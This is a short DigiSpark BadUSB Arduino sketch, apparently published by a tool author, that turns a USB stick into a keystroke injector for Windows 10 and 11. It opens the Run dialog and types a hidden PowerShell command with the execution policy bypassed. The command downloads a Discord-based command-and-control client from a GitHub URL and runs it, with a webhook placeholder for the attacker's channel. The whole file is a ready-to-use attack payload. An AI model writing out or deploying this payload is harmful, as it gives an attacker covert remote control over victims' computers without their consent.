// Title: beigeworm's Discord Command And Control.
// Author: @beigeworm
// Description: Using a Discord Server Chat and a github text file to Act as a Command and Control Platform.
// Target: Windows 10 and 11

// MORE INFO - https://github.com/beigeworm/DigiSpark-BadUSB-Setup-Guide

#include "DigiKeyboard.h"

void setup(){
}
void loop(){
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(21, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  
  DigiKeyboard.print("powershell.exe -NonI -NoP -Ep Bypass -W H -C $dc='WEBHOOK_HERE';");
  DigiKeyboard.print("irm https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1 | iex");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.delay(5000000);
}
